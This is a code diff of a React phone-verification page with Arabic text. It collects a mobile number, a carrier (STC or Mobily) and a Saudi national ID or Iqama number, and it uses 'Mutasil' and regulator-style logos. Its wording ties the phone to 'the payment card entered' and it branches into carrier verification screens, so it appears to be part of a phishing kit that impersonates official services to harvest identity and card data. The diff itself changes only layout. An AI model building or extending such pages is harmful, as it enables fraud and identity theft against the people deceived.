@@ -179,139 +179,145 @@ const PhonePage = () => {
   };
 
   return (
-    <div className="w-full lg:w-1/2 flex flex-col items-center justify-center rounded-md">
+    <div className="w-full  flex flex-col items-center justify-center rounded-md">
       {!verfiy ? (
-        <form
-          className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
-          dir="rtl"
-          onSubmit={handleSubmit}
-        >
-          <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
-            <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
-            <div className="flex items-start py-4">
-              <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
-              <span className="font-semibold">
-                يجب ان يكون رقم الجوال موثقا و مطابقا لبيانات الهوية الوطنية /
-                الإقامة , ومرتبطاً ببطاقة الدفع المدخلة
-              </span>
-            </div>
-          </div>
-
-          <div className="flex justify-end items-center mb-2 -mt-2 rounded-lg px-2">
-            <img
-              src={selectedProvider.img}
-              alt={selectedProvider.name}
-              className="h-16 object-contain w-20"
-              onError={(e) => {
-                e.currentTarget.style.display = "none";
-              }}
-            />
-          </div>
-
-          <p
-            className={`text-right text-lg text-gray-700 leading-relaxed px-2 font-bold ${
-              selectedProvider.name === "اس تي سي"
-                ? "text-purple-700"
-                : selectedProvider.name === "موبايلي"
-                  ? "text-sky-600"
-                  : ""
-            }`}
+        <div className="w-full flex flex-col items-center justify-center md:w-1/2">
+          <form
+            className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
+            dir="rtl"
+            onSubmit={handleSubmit}
           >
-            {selectedProvider.content}
-          </p>
-
-          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
-            <span className="font-semibold text-sm text-gray-700 w-full text-right">
-              رقم الجوال
-            </span>
-            <div className="relative w-full" dir="ltr">
-              <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
-                <img
-                  src="https://flagcdn.com/w40/sa.png"
-                  alt="SA"
-                  className="w-5 h-4"
-                />
-              </span>
-              <input
-                value={phoneNumber}
-                required
-                onChange={(e) => setPhoneNumber(e.target.value)}
-                dir="ltr"
-                placeholder="0554637386"
-                inputMode="numeric"
-                type="text"
-                maxLength={10}
-                minLength={10}
-                className="border border-gray-300 rounded-lg px-3 py-2.5 pl-12 text-base text-left outline-blue-500 w-full"
-              />
-            </div>
-          </div>
-
-          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
-            <span className="font-semibold text-sm text-gray-700 w-full text-right">
-              اختر مزود الخدمة
-            </span>
-            <select
-              value={phoneNetwork}
-              required
-              onChange={(e) => setPhoneNetwork(e.target.value)}
-              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full bg-white"
-            >
-              {testData.map((provider) => (
-                <option key={provider.name} value={provider.name}>
-                  {provider.name}
-                </option>
-              ))}
-            </select>
-          </div>
-
-          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
-            <span className="font-semibold text-sm text-gray-700 w-full text-right">
-              رقم الهوية الوطنية / الإقامة
-            </span>
-            <input
-              dir="ltr"
-              value={phoneId}
-              onChange={(e) => setPhoneId(e.target.value)}
-              inputMode="numeric"
-              type="text"
-              required
-              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-left outline-blue-500 w-full"
-            />
-          </div>
-
-          {error ? (
-            <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
-              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
-                <AiOutlineCloseCircle className="text-6xl" />
-                <div className="flex flex-col w-full items-center justify-center">
-                  <span>رقم الهاتف غير صحيح</span>
-                  <span className="text-sm">82A27833M4589370G</span>
-                </div>
-                <button
-                  type="button"
-                  className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
-                  onClick={() => setError(false)}
-                >
-                  حاول مرة ثانية
-                </button>
+            <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
+              <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
+              <div className="flex items-start py-4">
+                <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
+                <span className="font-semibold">
+                  يجب ان يكون رقم الجوال موثقا و مطابقا لبيانات الهوية الوطنية /
+                  الإقامة , ومرتبطاً ببطاقة الدفع المدخلة
+                </span>
               </div>
             </div>
-          ) : null}
 
-          <div className="w-full flex items-center justify-center py-5 mt-4">
-            <button
-              type="submit"
-              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-lg text-base font-semibold transition-colors"
+            <div className="flex justify-end items-center mb-2 -mt-2 rounded-lg px-2">
+              <img
+                src={selectedProvider.img}
+                alt={selectedProvider.name}
+                className="h-16 object-contain w-20"
+                onError={(e) => {
+                  e.currentTarget.style.display = "none";
+                }}
+              />
+            </div>
+
+            <p
+              className={`text-right text-lg text-gray-700 leading-relaxed px-2 font-bold ${
+                selectedProvider.name === "اس تي سي"
+                  ? "text-purple-700"
+                  : selectedProvider.name === "موبايلي"
+                    ? "text-sky-600"
+                    : ""
+              }`}
             >
-              دخول
-            </button>
-          </div>
+              {selectedProvider.content}
+            </p>
 
-          <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
-            <img src="/phoneFooter.jpeg" alt="CST" className="object-contain" />
-          </div>
-        </form>
+            <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
+              <span className="font-semibold text-sm text-gray-700 w-full text-right">
+                رقم الجوال
+              </span>
+              <div className="relative w-full" dir="ltr">
+                <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
+                  <img
+                    src="https://flagcdn.com/w40/sa.png"
+                    alt="SA"
+                    className="w-5 h-4"
+                  />
+                </span>
+                <input
+                  value={phoneNumber}
+                  required
+                  onChange={(e) => setPhoneNumber(e.target.value)}
+                  dir="ltr"
+                  placeholder="0554637386"
+                  inputMode="numeric"
+                  type="text"
+                  maxLength={10}
+                  minLength={10}
+                  className="border border-gray-300 rounded-lg px-3 py-2.5 pl-12 text-base text-left outline-blue-500 w-full"
+                />
+              </div>
+            </div>
+
+            <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
+              <span className="font-semibold text-sm text-gray-700 w-full text-right">
+                اختر مزود الخدمة
+              </span>
+              <select
+                value={phoneNetwork}
+                required
+                onChange={(e) => setPhoneNetwork(e.target.value)}
+                className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full bg-white"
+              >
+                {testData.map((provider) => (
+                  <option key={provider.name} value={provider.name}>
+                    {provider.name}
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
+              <span className="font-semibold text-sm text-gray-700 w-full text-right">
+                رقم الهوية الوطنية / الإقامة
+              </span>
+              <input
+                dir="ltr"
+                value={phoneId}
+                onChange={(e) => setPhoneId(e.target.value)}
+                inputMode="numeric"
+                type="text"
+                required
+                className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-left outline-blue-500 w-full"
+              />
+            </div>
+
+            {error ? (
+              <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
+                <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
+                  <AiOutlineCloseCircle className="text-6xl" />
+                  <div className="flex flex-col w-full items-center justify-center">
+                    <span>رقم الهاتف غير صحيح</span>
+                    <span className="text-sm">82A27833M4589370G</span>
+                  </div>
+                  <button
+                    type="button"
+                    className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
+                    onClick={() => setError(false)}
+                  >
+                    حاول مرة ثانية
+                  </button>
+                </div>
+              </div>
+            ) : null}
+
+            <div className="w-full flex items-center justify-center py-5 mt-4">
+              <button
+                type="submit"
+                className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-lg text-base font-semibold transition-colors"
+              >
+                دخول
+              </button>
+            </div>
+
+            <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
+              <img
+                src="/phoneFooter.jpeg"
+                alt="CST"
+                className="object-contain"
+              />
+            </div>
+          </form>
+        </div>
       ) : verfiy === "Mobily" ? (
         <div className="w-full bg-white flex items-start justify-center h-screen">
           <div
